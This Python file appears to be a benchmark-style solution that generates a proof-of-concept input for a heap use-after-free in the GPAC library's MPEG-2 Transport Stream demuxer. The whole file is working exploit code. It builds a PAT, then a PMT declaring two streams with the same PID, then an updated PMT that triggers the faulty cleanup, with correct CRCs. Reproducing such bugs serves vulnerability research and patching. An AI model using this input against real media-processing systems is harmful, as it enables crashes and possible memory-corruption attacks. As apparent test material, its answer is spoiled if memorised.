class Solution:
    """
    Generates a Proof-of-Concept input for a Heap Use After Free vulnerability
    in the GPAC library's MPEG-2 Transport Stream demuxer.
    """

    @staticmethod
    def _crc32_mpeg2(data: bytes) -> bytes:
        """
        Computes the CRC-32 checksum as specified for MPEG-2 standards.
        """
        poly = 0x04C11DB7
        crc = 0xFFFFFFFF
        for byte in data:
            crc ^= (byte << 24)
            for _ in range(8):
                if crc & 0x80000000:
                    crc = (crc << 1) ^ poly
                else:
                    crc <<= 1
        return (crc & 0xFFFFFFFF).to_bytes(4, 'big')

    @staticmethod
    def _create_ts_packet(pid: int, payload: bytes, pusi: bool, cc: int) -> bytes:
        """
        Creates a 188-byte MPEG-2 Transport Stream packet.
        """
        header = bytearray(4)
        header[0] = 0x47  # Sync byte
        
        # Payload Unit Start Indicator, PID
        header[1] = (pid >> 8) & 0x1F
        if pusi:
            header[1] |= 0x40
        header[2] = pid & 0xFF
        
        # Adaptation field control (0x1 = payload only), Continuity Counter
        header[3] = 0x10 | (cc & 0x0F)
        
        # Pad payload to fill the 184 bytes available in a simple packet
        padded_payload = payload.ljust(184, b'\xFF')
        
        return bytes(header + padded_payload)

    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC that triggers the vulnerability.

        The PoC is a minimal MPEG-2 TS file with three packets:
        1. A Program Association Table (PAT) to define a program.
        2. A Program Map Table (PMT) that introduces a corrupt state by defining
           two elementary streams with the same Packet ID (PID).
        3. A second, updated PMT (with a new version number) that modifies the
           program. This triggers a cleanup of the old streams. The demuxer's
           cleanup logic mishandles the corrupt state, leading to a
           use-after-free when trying to delete the stream-related data structures.

        Args:
            src_path: Path to the vulnerable source code tarball (unused).

        Returns:
            bytes: The PoC input that should trigger the vulnerability.
        """
        # Packet 1: Program Association Table (PAT)
        # Defines program 1, pointing to PMT at PID 0x0100
        pat_section = b'\x00\xb0\x0d\x00\x01\xc1\x00\x00\x00\x01\xe1\x00'
        pat_payload = b'\x00' + pat_section + self._crc32_mpeg2(pat_section)
        packet1 = self._create_ts_packet(pid=0x0000, payload=pat_payload, pusi=True, cc=0)

        # Packet 2: Program Map Table (PMT), version 0
        # Defines two streams with the same PID (0x0101) to create an invalid state.
        pmt_v0_section = (
            b'\x02\xb0\x17\x00\x01\xc1\x00\x00\xe1\x01\xf0\x00'
            b'\x1b\xe1\x01\xf0\x00'  # Stream 1 (H.264, PID 0x101)
            b'\x03\xe1\x01\xf0\x00'  # Stream 2 (MP3, PID 0x101)
        )
        pmt_v0_payload = b'\x00' + pmt_v0_section + self._crc32_mpeg2(pmt_v0_section)
        packet2 = self._create_ts_packet(pid=0x0100, payload=pmt_v0_payload, pusi=True, cc=0)

        # Packet 3: Program Map Table (PMT), version 1
        # An update that triggers cleanup of the previously defined streams.
        pmt_v1_section = (
            b'\x02\xb0\x12\x00\x01\xc3\x00\x00\xe1\x01\xf0\x00'
            b'\x1b\xe1\x02\xf0\x00'  # New, valid stream (H.264, PID 0x102)
        )
        pmt_v1_payload = b'\x00' + pmt_v1_section + self._crc32_mpeg2(pmt_v1_section)
        packet3 = self._create_ts_packet(pid=0x0100, payload=pmt_v1_payload, pusi=True, cc=1)
        
        return packet1 + packet2 + packet3